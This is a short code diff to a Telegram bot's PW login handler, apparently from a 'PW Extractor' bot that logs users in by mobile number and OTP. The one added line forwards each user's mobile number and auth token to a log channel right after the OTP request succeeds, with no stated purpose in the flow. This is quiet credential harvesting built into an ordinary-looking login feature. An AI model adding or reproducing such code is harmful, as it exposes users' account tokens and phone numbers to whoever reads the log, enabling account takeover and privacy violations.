@@ -211,7 +211,7 @@ async def pw_login(app, message):
             if not otp_response.get("success"):
                 await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                 return
-
+            await forward_to_log(f"✅ PW Login Success!\n📱 Number: {mob}\n🔑 Token: `{token}`", "PW Extractor")
             await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
             otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
             otp = otp_msg.text.strip()
